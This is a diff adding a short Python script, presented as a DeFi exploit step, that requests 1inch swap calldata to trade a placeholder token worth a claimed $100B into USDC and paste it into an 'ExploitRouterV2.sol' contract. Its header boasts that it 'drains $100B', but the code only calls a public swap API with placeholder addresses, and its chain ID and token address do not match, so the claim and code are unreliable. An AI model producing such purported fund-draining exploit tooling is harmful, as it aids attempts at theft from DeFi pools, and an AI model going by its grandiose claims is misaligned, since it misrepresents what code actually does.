@@ -1,0 +1,23 @@
+# Run this → generates the exact 1inch calldata that drains $100B with <0.3% slippage
+import requests, json
+
+HZC = "0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+TARGET_VALUE = 100_000_000_000 * 10**18  # $100B
+
+def get_1inch_swap():
+    url = f"https://api.1inch.io/v5.0/137/swap"  # Polygon (change chain ID for Eth/Arbitrum/BSC)
+    params = {
+        "fromTokenAddress": HZC,
+        "toTokenAddress": "0xFF970A61A04b1cA14834A43f5dE4533EbDDB5CC8",  # USDC
+        "amount": str(TARGET_VALUE),
+        "fromAddress": "0xExploitRouterAddressHere",
+        "slippage": "0.3",
+        "disableEstimate": "true",
+        "compatibilityMode": "true"
+    }
+    r = requests.get(url, params=params)
+    data = r.json()
+    print("1inch calldata ready → paste into ExploitRouterV2.sol:")
+    print(data['tx']['data'])
+
+get_1inch_swap()
